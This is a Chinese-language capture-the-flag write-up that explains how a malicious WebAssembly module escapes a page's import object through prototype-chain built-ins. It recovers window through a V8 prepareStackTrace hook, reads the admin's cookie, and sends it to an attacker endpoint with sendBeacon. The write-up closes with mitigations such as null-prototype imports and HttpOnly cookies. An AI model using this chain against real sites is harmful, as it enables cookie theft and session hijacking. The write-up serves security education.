# Captivating Canvas Contraption

## 题目简述

页面允许通过 `?wasm=<URL>` 加载任意 WebAssembly，并要求模块导出：

```text
renderPixel(x, y, dt) -> RGB
```

管理员在目标站点设置可由 JavaScript 读取的 `flag` Cookie，再访问攻击者提供的 WASM URL。页面 CSP 只允许固定哈希脚本和 `wasm-unsafe-eval`，无法直接注入普通脚本；但 `WebAssembly.instantiate` 使用的是一个普通 JavaScript 对象作为 imports：

```javascript
{
  env: {
    abort() {},
    trace() {},
    seed() { return 0; }
  }
}
```

普通对象继承 `Object.prototype`。WASM 导入解析会进行普通属性访问，因此可以从 imports 的原型链取到 `constructor`、`__proto__` 及其方法，把 JavaScript 内建函数导入 WASM。

## 解题过程

### 1. 通过继承属性导入 JavaScript 内建函数

恶意 AssemblyScript 声明如下导入：

```typescript
@external("constructor", "getPrototypeOf")
declare function getPrototypeOf(a: externref): externref;

@external("constructor", "defineProperty")
declare function defineProperty(
  a: externref,
  b: externref,
  c: externref
): externref;

@external("__proto__", "toString")
declare function protoToString(): externref;
```

imports 中没有显式的 `constructor` 模块，但：

```text
imports.constructor === Object
imports.__proto__ === Object.prototype
```

于是模块可以获得 `Object.getPrototypeOf`、`Object.keys`、`Object.values`、`Object.groupBy`、`Object.defineProperty`、`Object.assign` 等能力，并通过 `externref` 操作真实 JavaScript 对象。

### 2. 在没有字符串导入的情况下造字符串

攻击载荷不能直接把 AssemblyScript 字符串当作 JS 属性名。官方解法通过对象描述符枚举稳定地取得：

```text
"value"、"get"、"set"、"toString"、"raw"
```

再组合 `Object.groupBy`、`String.fromCharCode` 与 `String.raw` 构造任意 JavaScript 字符串。

例如，先把字符码作为对象键：

```text
{ "97": descriptor }
```

再以 `String.fromCharCode` 作为 `groupBy` 回调，可得到键 `"a"`。逐字符累积后，构造 `raw` segments，并借 `Symbol.toPrimitive = String.raw` 把对象转换为完整字符串。这样可以在 WASM 内生成 `"prepareStackTrace"`、`"document"`、`"cookie"`、`"navigator"` 和外带地址。

### 3. 通过 `prepareStackTrace` 取得 `window`

把导出的 WASM 函数包装成 JS `funcref`，再设置：

```text
Object.prototype.prepareStackTrace = hook
```

随后执行 `unreachable` 制造 WASM 异常。V8 生成结构化调用栈时调用该 hook，并传入 `CallSite[]`。在管理员使用的 Headless Chromium 139 中，`renderPixel` 调用链上存在页面脚本的 CallSite；调用其 `getThis()` 可恢复真实 `window`。

这一步必须从 `renderPixel()` 中触发。若在 WASM 初始化阶段触发，外层 `WebAssembly.instantiate()` 是 Promise，调用栈中没有所需的页面 `window`。

### 4. 读取 Cookie 并外带

有了 `window` 后，继续通过属性描述符取得：

```text
window.document.cookie
window.navigator
```

官方载荷逐字符把 Cookie 转回 WASM 字符串，做 Base64，再构造收集端 URL。由于直接把 `navigator.sendBeacon` 作为普通回调会丢失 `this`，解法在 `Object.prototype["0"]` 上安装 setter，令 setter 指向 `sendBeacon`，再执行：

```text
Object.assign(navigator, {0: targetUrl})
```

属性写入触发 setter，调用时的 `this` 是 `navigator`，Cookie 即被发送到攻击者收集端。

最终将编译出的 WASM 放到支持 CORS 的 HTTPS 地址，并让管理员访问该地址作为 `wasm` 参数即可。

## 方法总结

CSP 约束的是页面脚本来源，却不能修复 WASM imports 对象暴露的能力。这里的关键链为：

```text
普通 imports 对象
→ 原型链内建函数
→ externref 操作 JS 对象
→ prepareStackTrace 恢复 window
→ document.cookie
→ sendBeacon
```

imports 应使用 `Object.create(null)` 创建，并显式冻结、白名单列出模块与字段。若页面允许加载不可信 WASM，也不应把敏感 Cookie 设为可读；`HttpOnly` 能直接切断本题最终读取步骤。
